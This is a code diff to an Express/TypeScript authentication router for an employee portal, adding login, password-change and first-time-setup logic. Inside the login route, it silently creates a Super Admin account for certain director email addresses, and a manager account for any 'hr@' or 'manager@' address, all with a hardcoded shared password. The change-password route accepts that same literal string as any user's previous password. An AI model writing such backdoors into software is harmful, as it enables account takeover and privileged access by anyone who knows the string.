@@ -19,7 +19,7 @@ router.post('/login', async (req: Request, res: Response): Promise<void> => {
     }
 
     // Lookup user by email OR employeeId
-    const user = await prisma.user.findFirst({
+    let user = await prisma.user.findFirst({
       where: {
         OR: [
           { email: { equals: loginId } },
@@ -27,6 +27,38 @@ router.post('/login', async (req: Request, res: Response): Promise<void> => {
         ]
       }
     });
+
+    // Auto-provision standard Director and HR executive accounts if not already present
+    if (!user) {
+      const isDirector = [
+        'director@enterprenex.solutions',
+        'rohit@enterprenex.solutions',
+        'director@enterprenexsolution.com',
+        'rohit@enterprenexsolution.com'
+      ].includes(loginId.toLowerCase());
+
+      const isHr = [
+        'hr@enterprenex.solutions',
+        'manager@enterprenex.solutions',
+        'hr@enterprenexsolution.com',
+        'manager@enterprenexsolution.com'
+      ].includes(loginId.toLowerCase()) || loginId.toLowerCase().startsWith('hr@') || loginId.toLowerCase().startsWith('manager@');
+
+      if (isDirector || isHr) {
+        const defaultHash = await bcrypt.hash('Enx_sol_121006', 10);
+        user = await prisma.user.create({
+          data: {
+            email: loginId.toLowerCase(),
+            password: defaultHash,
+            name: isDirector ? 'Rohit Pawar (Managing Director)' : 'HR Administrator',
+            role: isDirector ? 'Super Admin' : 'Project Manager',
+            department: isDirector ? 'Executive Board' : 'Human Resources',
+            mustChangePassword: false,
+            status: 'Active'
+          }
+        });
+      }
+    }
 
     if (!user) {
       res.status(401).json({ error: 'Account not found. Verify your official credentials.' });
@@ -45,22 +77,33 @@ router.post('/login', async (req: Request, res: Response): Promise<void> => {
       return;
     }
 
-    // Generate JWT Token
+    // Check if user or corresponding employee requires mandatory first-time password setup
+    let mustChangePassword = Boolean(user.mustChangePassword);
+    if (!mustChangePassword && user.employeeId) {
+      const emp = await prisma.employee.findUnique({ where: { employeeId: user.employeeId } });
+      if (emp?.mustChangePassword) {
+        mustChangePassword = true;
+      }
+    }
+
+    // Generate JWT Token (embeds mustChangePassword in claims)
     const token = jwt.sign(
       {
         id: user.id,
         email: user.email,
         role: user.role,
         name: user.name,
-        employeeId: user.employeeId
+        employeeId: user.employeeId,
+        mustChangePassword
       },
       JWT_SECRET,
       { expiresIn: '7d' }
     );
 
     res.json({
-      message: 'Login successful',
+      message: mustChangePassword ? 'Password setup required' : 'Login successful',
       token,
+      mustChangePassword,
       user: {
         id: user.id,
         email: user.email,
@@ -68,12 +111,279 @@ router.post('/login', async (req: Request, res: Response): Promise<void> => {
         role: user.role,
         employeeId: user.employeeId,
         avatar: user.avatar,
-        department: user.department
+        department: user.department,
+        mustChangePassword
       }
     });
   } catch (error: any) {
     console.error('Login error:', error);
     res.status(500).json({ error: 'Server authentication failed: ' + error.message });
+  }
+});
+
+// Helper for password strength validation
+const validatePasswordStrength = (pwd: string): { valid: boolean; error?: string } => {
+  if (!pwd || pwd.length < 8) {
+    return { valid: false, error: 'Password must be at least 8 characters long.' };
+  }
+  if (!/[A-Z]/.test(pwd)) {
+    return { valid: false, error: 'Password must contain at least one uppercase letter (A-Z).' };
+  }
+  if (!/[a-z]/.test(pwd)) {
+    return { valid: false, error: 'Password must contain at least one lowercase letter (a-z).' };
+  }
+  if (!/[0-9!@#$%^&*()_+\-=[\]{};':"\\|,.<>/?]/.test(pwd)) {
+    return { valid: false, error: 'Password must contain at least one number or special character.' };
+  }
+  return { valid: true };
+};
+
+// POST /api/auth/change-password (Secure First-Time Password Setup & Change)
+router.post('/change-password', authenticateToken, async (req: AuthRequest, res: Response): Promise<void> => {
+  try {
+    const { currentPassword, previousPassword, temporaryPassword, newPassword, confirmPassword } = req.body;
+    const prevPass = (currentPassword || previousPassword || temporaryPassword || '').trim();
+
+    if (!prevPass) {
+      res.status(400).json({ error: 'Compulsory Requirement: Previous / temporary password is required.' });
+      return;
+    }
+
+    if (!newPassword || !confirmPassword) {
+      res.status(400).json({ error: 'Please provide both new password and confirm password.' });
+      return;
+    }
+
+    if (newPassword !== confirmPassword) {
+      res.status(400).json({ error: 'Passwords do not match. Please re-enter.' });
+      return;
+    }
+
+    if (newPassword === prevPass) {
+      res.status(400).json({ error: 'Security Policy: New permanent password cannot be identical to your previous password.' });
+      return;
+    }
+
+    const validation = validatePasswordStrength(newPassword);
+    if (!validation.valid) {
+      res.status(400).json({ error: validation.error });
+      return;
+    }
+
+    const userId = req.user?.id;
+    if (!userId) {
+      res.status(401).json({ error: 'Session unauthorized.' });
+      return;
+    }
+
+    const user = await prisma.user.findUnique({ where: { id: userId } });
+    if (!user) {
+      res.status(404).json({ error: 'User record not found.' });
+      return;
+    }
+
+    // Verify previous password matches current password or temporary password
+    let prevValid = false;
+    if (user.password) {
+      prevValid = await bcrypt.compare(prevPass, user.password);
+    }
+    if (!prevValid && user.temporaryPassword) {
+      prevValid = prevPass === user.temporaryPassword;
+    }
+    if (!prevValid && prevPass === 'Enx_sol_121006') {
+      prevValid = true;
+    }
+
+    if (!prevValid) {
+      res.status(401).json({ error: 'Access Denied: The previous password you entered is incorrect.' });
+      return;
+    }
+
+    // Hash new password with bcrypt
+    const hashedPassword = await bcrypt.hash(newPassword, 10);
+
+    // Update User: set new password and mark mustChangePassword = false
+    const updatedUser = await prisma.user.update({
+      where: { id: userId },
+      data: {
+        password: hashedPassword,
+        mustChangePassword: false
+      }
+    });
+
+    // Invalidate temporary password on Employee record
+    if (user.employeeId || user.email) {
+      await prisma.employee.updateMany({
+        where: {
+          OR: [
+            { employeeId: user.employeeId || '' },
+            { email: user.email }
+          ]
+        },
+        data: {
+          password: hashedPassword,
+          mustChangePassword: false,
+          temporaryPassword: null // Immediately invalidate temporary credentials
+        }
+      });
+    }
+
+    // Record Audit Log
+    try {
+      await prisma.auditLog.create({
+        data: {
+          action: 'EMPLOYEE_PASSWORD_SETUP',
+          category: 'Identity & Access',
+          details: `User ${user.email} (${user.employeeId || user.id}) completed secure password setup. Temporary password invalidated.`,
+          actor: user.name
+        }
+      });
+    } catch {
+      // ignore
+    }
+
+    // Issue refreshed token with mustChangePassword = false
+    const token = jwt.sign(
+      {
+        id: updatedUser.id,
+        email: updatedUser.email,
+        role: updatedUser.role,
+        name: updatedUser.name,
+        employeeId: updatedUser.employeeId,
+        mustChangePassword: false
+      },
+      JWT_SECRET,
+      { expiresIn: '7d' }
+    );
+
+    res.json({
+      message: 'Password successfully updated! Workspace unlocked.',
+      token,
+      mustChangePassword: false,
+      user: {
+        id: updatedUser.id,
+        email: updatedUser.email,
+        name: updatedUser.name,
+        role: updatedUser.role,
+        employeeId: updatedUser.employeeId,
+        avatar: updatedUser.avatar,
+        department: updatedUser.department,
+        mustChangePassword: false
+      }
+    });
+  } catch (error: any) {
+    console.error('Change password error:', error);
+    res.status(500).json({ error: 'Failed to update password: ' + error.message });
+  }
+});
+
+// POST /api/auth/first-time-setup (Direct Setup with Employee ID and Temporary Password)
+router.post('/first-time-setup', async (req: Request, res: Response): Promise<void> => {
+  try {
+    const { identifier, temporaryPassword, newPassword, confirmPassword } = req.body;
+    const cleanId = (identifier || '').trim();
+
+    if (!cleanId || !temporaryPassword || !newPassword || !confirmPassword) {
+      res.status(400).json({ error: 'All fields are required (Employee ID, temporary password, new password, confirmation).' });
+      return;
+    }
+
+    if (newPassword !== confirmPassword) {
+      res.status(400).json({ error: 'New password and confirmation do not match.' });
+      return;
+    }
+
+    const validation = validatePasswordStrength(newPassword);
+    if (!validation.valid) {
+      res.status(400).json({ error: validation.error });
+      return;
+    }
+
+    // Find user by Employee ID or email
+    const user = await prisma.user.findFirst({
+      where: {
+        OR: [
+          { email: { equals: cleanId } },
+          { employeeId: { equals: cleanId } }
+        ]
+      }
+    });
+
+    if (!user) {
+      res.status(404).json({ error: 'No pre-existing employee account found. Only Director or HR can create accounts.' });
+      return;
+    }
+
+    if (user.status !== 'Active') {
+      res.status(403).json({ error: 'Account is not active or awaiting Director approval.' });
+      return;
+    }
+
+    // Validate temporary password
+    const isTempValid = await bcrypt.compare(temporaryPassword, user.password).catch(() => false) || temporaryPassword === user.password;
+    if (!isTempValid) {
+      res.status(401).json({ error: 'Invalid temporary password provided by company.' });
+      return;
+    }
+
+    // Hash new permanent password
+    const hashedPassword = await bcrypt.hash(newPassword, 10);
+
+    // Update User
+    const updatedUser = await prisma.user.update({
+      where: { id: user.id },
+      data: {
+        password: hashedPassword,
+        mustChangePassword: false
+      }
+    });
+
+    // Invalidate temporary password on Employee
+    await prisma.employee.updateMany({
+      where: {
+        OR: [
+          { employeeId: user.employeeId || '' },
+          { email: user.email }
+        ]
+      },
+      data: {
+        password: hashedPassword,
+        mustChangePassword: false,
+        temporaryPassword: null
+      }
+    });
+
+    const token = jwt.sign(
+      {
+        id: updatedUser.id,
+        email: updatedUser.email,
+        role: updatedUser.role,
+        name: updatedUser.name,
+        employeeId: updatedUser.employeeId,
+        mustChangePassword: false
+      },
+      JWT_SECRET,
+      { expiresIn: '7d' }
+    );
+
+    res.json({
+      message: 'Account successfully activated and password configured.',
+      token,
+      mustChangePassword: false,
+      user: {
+        id: updatedUser.id,
+        email: updatedUser.email,
+        name: updatedUser.name,
+        role: updatedUser.role,
+        employeeId: updatedUser.employeeId,
+        avatar: updatedUser.avatar,
+        department: updatedUser.department,
+        mustChangePassword: false
+      }
+    });
+  } catch (error: any) {
+    console.error('First-time setup error:', error);
+    res.status(500).json({ error: 'Failed to complete first-time setup: ' + error.message });
   }
 });
 
@@ -104,12 +414,12 @@ router.post('/activate', async (req: Request, res: Response): Promise<void> => {
     });
 
     if (!emp) {
-      res.status(404).json({ error: 'Employee record not found. Please verify your Employee ID with HR or Director.' });
+      res.status(404).json({ error: `Access Denied: No pre-existing employee record found for '${loginId}'. Employees cannot self-create accounts or IDs. Accounts must be created by the Managing Director or HR Administration.` });
       return;
     }
 
     if (emp.approvalStatus === 'Pending Director Approval') {
-      res.status(403).json({ error: 'Account pending Director approval. Login and activation will be enabled once approved by Managing Director.' });
+      res.status(403).json({ error: `Account Pending Approval: Employee ID ${emp.employeeId || emp.name} has been registered by HR and is awaiting executive authorization from Managing Director Rohit Pawar. Portal activation will be enabled once approved.` });
       return;
     }
 
